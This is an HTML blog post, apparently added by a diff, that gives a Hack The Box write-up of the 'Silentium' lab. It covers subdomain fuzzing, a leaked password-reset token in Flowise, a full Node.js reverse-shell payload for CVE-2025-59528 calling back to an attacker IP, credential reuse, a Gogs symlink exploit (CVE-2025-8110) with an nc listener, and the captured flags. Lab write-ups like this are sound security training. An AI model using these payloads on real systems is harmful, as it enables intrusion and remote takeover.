@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Silentium HTB Writeup | Flowise RCE & Gogs Exploit</title>
+    <meta name="description" content="Detailed walkthrough of the Silentium HTB machine. Exploiting Flowise AI token leaks, RCE via CVE-2025-59528, and Gogs Symlink RCE.">
+    <link rel="stylesheet" href="../../../style.css">
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <nav>
+        <div class="logo"><a href="../../../index.html">gr4ktung</a></div>
+        
+        <div class="search-container">
+            <span class="search-prompt">gr4ktung@blog:~$ grep</span>
+            <input type="text" id="site-search" placeholder="..." autocomplete="off">
+        </div>
+
+        <div class="nav-links">
+            <a href="../../../about.html">~/about</a>
+            <a href="../../../blog.html" class="active">~/posts</a>
+            <a href="../../../achievements.html">~/achievements</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="writeup-layout">
+            
+            <aside class="sidebar">
+                <h4>MISSION_BRIEF</h4>
+                <div class="intel-grid">
+                    <div class="detail-box">
+                        <span class="label">Target</span>
+                        <span class="value">Silentium</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Category</span>
+                        <span class="value">Linux / Easy</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Event</span>
+                        <span class="value">HTB Labs</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Difficulty</span>
+                        <span class="value" style="color: #00ff41;">Easy</span>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <span class="tag">Flowise RCE</span>
+                    <span class="tag">Gogs CVE</span>
+                    <span class="tag">Token Leak</span>
+                    <span class="tag">Docker Escape</span>
+                </div>
+            </aside>
+
+            <article class="blog-content" style="min-width: 0;">
+                <h1>Writeup: Silentium (HTB)</h1>
+                <div class="blog-meta">
+                    > Published: April 20, 2026 | ⏱ 10 min read | Author: gr4ktung
+                </div>
+
+                <h3>📖 Introduction</h3>
+                <p>It's the 20th of April and I was bored after school exams harassing me 😂😂. My teammate <strong>mrparrot</strong> asked if I could team up to pwn a new HTB lab... so I said why not. It had been about 2 years since I touched HTB, but some things you never forget. Let's t3rmin4t3 this server! 🔥</p>
+                
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../hackthebox/images/silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 1: Recon & Port Scanning</h3>
+                <p>I started with a full aggressive Nmap scan to map out the attack surface:</p>
+
+                <img src="../hackthebox/images/nmapscan-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <div class="command-block">nmap -A 10.129.36.231</div>
+                 
+                <p><strong>Key Takeaways:</strong></p>
+                <ul>
+                    <li><strong>Port 22:</strong> OpenSSH 9.6p1 (Ubuntu)</li>
+                    <li><strong>Port 80:</strong> nginx 1.24.0 (Redirects to <code>http://silentium.htb/</code>)</li>
+                </ul>
+
+                <p>Only two ports open? This means the web application is going to be our primary entry point. I added the domain to my <code>/etc/hosts</code> file and started digging.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 2: Virtual Host Discovery</h3>
+                <p>The main landing page for <code>silentium.htb</code> was a static institutional finance site. Nothing exploitable. I ran <strong>ffuf</strong> to search for subdomains:</p>
+                
+                <img src="../hackthebox/images/subdomainscan-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <div class="command-block">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+-H "Host: FUZZ.silentium.htb" -u http://silentium.htb -fs 178</div>
+
+                <p><strong>Result:</strong> Found <code>staging.silentium.htb</code>. This host revealed a **Flowise AI** platform—a low-code LLM workflow builder.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 3: Authentication Bypass (Token Leak)</h3>
+                <p>While testing the login panel, I noticed that the application leaked information based on email responses. <code>test@silentium.htb</code> returned "user not found," but <code>ben@silentium.htb</code> gave a different response. Enumeration confirmed!</p>
+
+                <img src="../hackthebox/images/teststaging-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <img src="../hackthebox/images/benstaging-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                
+                <p>I triggered a password reset for <strong>ben</strong> and inspected the network traffic in DevTools. The API response was catastrophically insecure:</p>
+
+                <img src="../hackthebox/images/benforgot-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <div class="command-block">{
+  "user": {
+    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
+    "email": "ben@silentium.htb",
+    "tempToken": "FnKtgs9SOZOLZSpvgGPRHKqUKVchMgANu5GccAwTgLoCclWakN6394OzfRBEsLkv"
+  }
+}</div>
+
+                <p>I used the leaked <code>tempToken</code> to reset Ben's password and successfully logged into the Flowise dashboard.</p>
+
+                <img src="../hackthebox/images/bendashboard-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 4: RCE via Flowise (CVE-2025-59528)</h3>
+                <p>Researching Flowise vulnerabilities led me to <strong>CVE-2025-59528</strong>, which allows Remote Code Execution via the <code>customMCP</code> method. I captured my JWT token and fired a reverse shell payload:</p>
+
+                <img src="../hackthebox/images/curlben-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../hackthebox/images/customMCP-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <div class="command-block">curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+-H "Content-Type: application/json" \
+--cookie "token=[REDACTED_JWT]" \
+-d '{
+  "loadMethod": "listActions",
+  "inputs": {
+    "mcpServerConfig": "({x:(function(){
+      const cp = process.mainModule.require(\"child_process\");
+      const net = process.mainModule.require(\"net\");
+      const sh = cp.spawn(\"/bin/sh\", [\"-i\"]);
+      const client = new net.Socket();
+      client.connect(4444, \"[ATTACKER_IP]\", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+      });
+      return 1;
+    })()})"
+  }
+}'</div>
+
+                <p>I caught the shell </p>
+                <img src="../hackthebox/images/dockershell-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <p>And found myself as <strong>root</strong>... but inside a Docker container. Checking the environment variables revealed an SMTP password: <code>r04D!!_R4ge</code>. </p>
+                <img src="../hackthebox/images/dockerenv-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <p>Testing this for SSH as Ben worked perfectly!</p>
+
+                <img src="../hackthebox/images/ssheben-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <p>And there I got the user flag</p>
+                <img src="../hackthebox/images/userflag-silentium.png" alt="Challenge Interface" class="content-img">
+
+
+                <div style="text-align: center; margin-top: 40px;">
+                    <div class="flag-block">USER: 6ee3158e9437dc74c996f583e48ef9b9</div>
+                </div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 5: Internal Pivoting (Gogs)</h3>
+                <p>Checking internal services with <code>ss -tlnp</code>, I found Gogs running on port 3001. </p>
+                <img src="../hackthebox/images/services-running-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <p> I discovered Gogs was running as <strong>root</strong> after looking at the configurations files...</p>
+                <img src="../hackthebox/images/gogs-config-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <p>After which i port forwarded the service to my local machine </p>
+
+                <p>Visiting the browser i had to register a new user and i registered a user test and logged in</p>
+                <img src="../hackthebox/images/testdashboard-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <p>In the system i tried creating a sample repo to try and exploit but failed... i tried using exploits but most of the exploit i used failed</p>
+
+                <img src="../hackthebox/images/fail-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                
+                <p>But then i found an interesting script... here is the github repo:</p>
+                <div class="command-block">https://github.com/0dgt/CVE-2025-8110</div>
+                <p>I used <strong>CVE-2025-8110</strong> (Symlink RCE). By creating a repository that overwrites <code>.git/config</code> and injecting a <code>core.sshCommand</code>, I could execute arbitrary commands on the host when the repository is accessed.</p>
+
+
+                <img src="../hackthebox/images/rce-silentium.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <div class="command-block">python3 rce.py --url http://localhost:3001 --host 10.10.17.73 --port 6666--username test --password 'tester123'</div>
+
+                
+
+                <p>I set up a port listener using nc -lvnp 6666</p>
+
+                <p>The exploit triggered, and my listener caught the final shell of the day.</p>
+
+                <img src="../hackthebox/images/silentium-root.png" alt="Challenge Interface" class="content-img">
+
+                
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <div style="text-align: center; margin-top: 40px;">
+                    <div class="flag-block">ROOT: 4534f9e70f1dcd487714ff7c0560b9bb</div>
+                </div>
+
+                <div class="post-nav">
+                    <a href="../../../blog.html" class="btn">RETURN_TO_DIR</a>
+                </div>
+            </article>
+
+            
+        </div>
+    </main>
+
+    <footer>
+        <p>sys.exit(0) | Designed by gr4ktung </p>
+    </footer>
+
+    <div class="scroll-controls">
+        <button class="scroll-btn" id="scroll-to-top">↑</button>
+        <button class="scroll-btn" id="scroll-to-bottom">↓</button>
+    </div>
+
+    <script src="../../../script.js"></script>
+</body>
+</html>
